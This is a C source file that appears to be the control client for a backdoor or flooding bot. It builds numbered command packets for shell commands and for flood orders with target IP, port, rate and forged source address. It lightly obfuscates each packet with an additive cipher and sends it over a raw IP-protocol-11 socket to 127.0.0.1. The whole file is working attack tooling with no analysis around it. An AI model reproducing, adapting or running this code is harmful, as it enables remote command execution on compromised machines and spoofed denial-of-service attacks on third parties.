#include <stdio.h>
#include <sys/time.h>
#include <sys/resource.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include<unistd.h>
#include<stdlib.h>
#include<stdio.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
void encrypt(const unsigned char *src,unsigned char *dst,const int len)
{
  int i;
  dst[0]=src[0]+0x17;
  for(i=1;i<len;i++)
    dst[i]=dst[i-1]+src[i]+0x17;
}


int open_sock()
{
  int sock = 0;
  sock = socket(PF_INET, SOCK_RAW, 0x0B);

  if (sock == -1)
  {
    if(errno==EMFILE)   /* Too many open file */
    {
      /* Il faudrait creer un pool de socket */
      return 0;
    }
    else
    {
      printf("opening TCP socket %s\n", sys_errlist[errno]);
      return -1;
    }
  }
  printf("open_sock TCP =>%d\n",sock);
  return sock;
}

int my_write(const int fd,const char*serveur, const char *data, const int len)
{
  unsigned char new_data[4000];
  struct sockaddr_in address;
  if(inet_pton(AF_INET,serveur,&address.sin_addr)==-1)
  {
    printf("inet_pton failed for %s\n",serveur);
    return errno;
  }
  address.sin_family = AF_INET;
  new_data[0]=data[0];
  new_data[1]=data[1];
  encrypt(data+2,new_data+2,len-2);
  if(sendto(fd,new_data,len,0,(struct sockaddr *)&address,sizeof(address))==-1)
  {
    printf("%d sendto %s %s(%d)\n",fd,serveur,sys_errlist[errno],errno);
    return errno;
  }
  return 0;
}


int main(int argc, char **argv)
{
  int a,b,c,d,port;
  unsigned char buff[0x800];
  unsigned char *data=&buff[2];
  int sock;
  if(argc<2)
    return 1;
  /* The real client should be able to forge the source address */
  sock=open_sock();
  memset(buff,0,sizeof(buff));
  buff[0]=2;
  data[1]=atoi(argv[1]);
  switch(data[1])
  {
    case 1:
      break;
    case 2:
      if(argc<=3)
      {
	printf("usage: client 2 [0|2] ip\n");
	return 1;
      }
      sscanf(argv[3],"%d.%d.%d.%d",&a,&b,&c,&d);
      /* 0 2 */
      data[2]=atoi(argv[2]);
      data[3]=a;
      data[4]=b;
      data[5]=c;
      data[6]=d;
      break;
    case 3:
    case 7:
      if(argc<=2)
      {
	printf("usage: client %d cmd\n",data[1]);
	return 1;
      }
      strcpy(&data[2],argv[2]);
      break;
    case 4:
      {
	if(argc<=2)
	{
	  printf("usage: client 4 ip_src:port_src [name_src]\n");
	  return 1;
	}
	sscanf(argv[2],"%d.%d.%d.%d:%d",&a,&b,&c,&d,&port);
	data[2]=a;
	data[3]=b;
	data[4]=c;
	data[5]=d;
	data[6]=port>>8;
	data[7]=port;
	if(argc>3)
	{
	  data[8]=1;
	  strcpy(&data[9],argv[3]);
	}
      }
      break;
    case 5:
      if(argc<5)
      {
	printf("usage: client 5 ? ip_src ip_dst:port_dst nom\n");
	return 1;
      }
      data[2]=atoi(argv[2]);
      sscanf(argv[3],"%d.%d.%d.%d",&a,&b,&c,&d);

      data[8]=a;
      data[9]=b;
      data[10]=c;
      data[11]=d;
      sscanf(argv[4],"%d.%d.%d.%d:%d",&a,&b,&c,&d,&port);
      data[3]=port;
      data[4]=a;
      data[5]=b;
      data[6]=c;
      data[7]=d;
      if(argc>5)
      {
	data[12]=1;
	strcpy(&data[13],argv[5]);
      }
      break;
    case 6:
    case 8:
      break;
    case 9:
      {
	if(argc<4)
	{
	  printf("usage: client 9 ip_src:port_src max [name_src]\n");
	  return 1;
	}
	sscanf(argv[2],"%d.%d.%d.%d:%d",&a,&b,&c,&d,&port);
	data[2]=a;
	data[3]=b;
	data[4]=c;
	data[5]=d;
	data[6]=atoi(argv[3]);
	data[7]=port>>8;
	data[8]=port;
	if(argc>4)
	{
	  data[9]=1;
	  strcpy(&data[10],argv[4]);
	}
      }
      break;
    case 10:
      if(argc<=3)
      {
	printf("usage: client 11 (ip_src|0.0.0.0) ip_dst:port [name_dst]\n");
	return 1;
      }
      sscanf(argv[3],"%d.%d.%d.%d:%d",&a,&b,&c,&d,&port);
      data[2]=a;	// IP dst
      data[3]=b;
      data[4]=c;
      data[5]=d;
      data[6]=port>>8;	// TCP  port dst
      data[7]=port;
      sscanf(argv[2],"%d.%d.%d.%d",&a,&b,&c,&d);
      if(a)
	data[8]=1;	// use IP src
      data[9]=a;	// IP src
      data[10]=b;
      data[11]=c;
      data[12]=d;
      if(argc>4)
      {
	data[13]=1;
	strcpy(&data[14],argv[4]);
      }
      break;
    case 11:
      if(argc<=4)
      {
	printf("usage: client 11 (ip_src|0.0.0.0) ip_dst:port max [name_dst]\n");
	return 1;
      }
      sscanf(argv[3],"%d.%d.%d.%d:%d",&a,&b,&c,&d,&port);
      data[2]=a;	// IP dst
      data[3]=b;
      data[4]=c;
      data[5]=d;
      data[6]=port>>8;	// TCP  port dst
      data[7]=port;
      sscanf(argv[2],"%d.%d.%d.%d",&a,&b,&c,&d);
      if(a)
	data[8]=1;	// use IP src
      data[9]=a;	// IP src
      data[10]=b;
      data[11]=c;
      data[12]=d;
      data[13]=atoi(argv[4]);
      if(argc>5)
      {
	data[14]=1;
	strcpy(&data[15],argv[5]);
      }
      break;
    case 12:
      {
	if(argc<5)
	{
	  printf("usage: client 12 ip_src:port ip_dst max [name_dst]\n");
	  return 1;
	}
	sscanf(argv[2],"%d.%d.%d.%d:%d",&a,&b,&c,&d,&port);
	data[6]=a;
	data[7]=b;
	data[8]=c;
	data[9]=d;
	data[11]=port>>8;
	data[12]=port;
	sscanf(argv[3],"%d.%d.%d.%d",&a,&b,&c,&d);
	data[2]=a;
	data[3]=b;
	data[4]=c;
	data[5]=d;
	data[10]=atoi(argv[4]);
	if(argc>5)
	{
	  data[13]=1;
	  strcpy(&data[14],argv[5]);
	}
      }
      break;
  }
  my_write(sock,"127.0.0.1",buff,181);
  close(sock);
  return 0;
}
